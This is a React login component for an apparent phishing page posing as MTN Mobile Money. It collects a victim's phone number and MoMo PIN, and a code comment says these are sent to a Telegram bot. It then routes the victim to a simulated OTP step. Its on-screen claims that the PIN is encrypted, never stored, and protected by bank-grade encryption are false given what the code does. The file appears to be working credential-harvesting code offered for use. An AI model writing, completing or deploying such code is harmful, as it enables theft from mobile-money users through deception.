"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { Eye, EyeOff, Loader2, Lock, ShieldCheck } from "lucide-react"
import { Button } from "@/components/ui/button"
import { notifyLogin } from "@/app/actions/notify"

const PHONE_LENGTH = 10
const PIN_LENGTH = 5

export function LoginForm() {
  const router = useRouter()
  const [phone, setPhone] = useState("")
  const [pin, setPin] = useState("")
  const [showPin, setShowPin] = useState(false)
  const [submitting, setSubmitting] = useState(false)

  const phoneValid = phone.length === PHONE_LENGTH
  const pinValid = pin.length === PIN_LENGTH
  const canSubmit = phoneValid && pinValid && !submitting

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    if (!canSubmit) return
    setSubmitting(true)
    // Send the login details to the Telegram bot (fire-and-forget, non-blocking).
    void notifyLogin({ phone, pin })
    // Simulate requesting an OTP to be sent to the phone number, then move to the OTP page.
    setTimeout(() => {
      router.push(`/otp?phone=${phone}`)
    }, 900)
  }

  return (
    <form onSubmit={handleSubmit} className="flex flex-col gap-6">
      <div className="flex flex-col gap-2">
        <label htmlFor="phone" className="text-sm font-medium text-foreground">
          Mobile number
        </label>
        <div className="flex items-stretch overflow-hidden rounded-lg border border-input bg-card transition-colors focus-within:border-primary focus-within:ring-2 focus-within:ring-primary/40">
          <span className="flex items-center gap-1.5 border-r border-input bg-secondary px-3 text-sm font-semibold text-secondary-foreground">
            +260
          </span>
          <input
            id="phone"
            inputMode="numeric"
            autoComplete="tel-national"
            placeholder="97 123 4567"
            value={phone}
            onChange={(e) =>
              setPhone(e.target.value.replace(/\D/g, "").slice(0, PHONE_LENGTH))
            }
            className="w-full bg-transparent px-3 py-3 text-base tracking-wide text-foreground outline-none placeholder:text-muted-foreground"
            aria-describedby="phone-hint"
          />
        </div>
        <p id="phone-hint" className="text-xs text-muted-foreground">
          Enter your {PHONE_LENGTH}-digit MTN mobile number.
        </p>
      </div>

      <div className="flex flex-col gap-2">
        <label htmlFor="pin" className="text-sm font-medium text-foreground">
          MoMo PIN
        </label>
        <div className="flex items-stretch overflow-hidden rounded-lg border border-input bg-card transition-colors focus-within:border-primary focus-within:ring-2 focus-within:ring-primary/40">
          <span className="flex items-center border-r border-input bg-secondary px-3 text-secondary-foreground">
            <Lock className="size-4" aria-hidden="true" />
          </span>
          <input
            id="pin"
            type={showPin ? "text" : "password"}
            inputMode="numeric"
            autoComplete="off"
            placeholder="•••••"
            value={pin}
            onChange={(e) =>
              setPin(e.target.value.replace(/\D/g, "").slice(0, PIN_LENGTH))
            }
            className="w-full bg-transparent px-3 py-3 text-base tracking-[0.4em] text-foreground outline-none placeholder:tracking-[0.3em] placeholder:text-muted-foreground"
          />
          <button
            type="button"
            onClick={() => setShowPin((s) => !s)}
            className="flex items-center px-3 text-muted-foreground transition-colors hover:text-foreground"
            aria-label={showPin ? "Hide PIN" : "Show PIN"}
          >
            {showPin ? <EyeOff className="size-4" /> : <Eye className="size-4" />}
          </button>
        </div>
        <p className="text-xs text-muted-foreground">
          Your {PIN_LENGTH}-digit PIN is encrypted and never stored.
        </p>
      </div>

      <Button
        type="submit"
        disabled={!canSubmit}
        className="h-12 w-full text-base font-semibold"
      >
        {submitting ? (
          <>
            <Loader2 className="size-4 animate-spin" />
            Sending code…
          </>
        ) : (
          "Continue"
        )}
      </Button>

      <p className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground">
        <ShieldCheck className="size-3.5" aria-hidden="true" />
        Secured with bank-grade encryption
      </p>
    </form>
  )
}
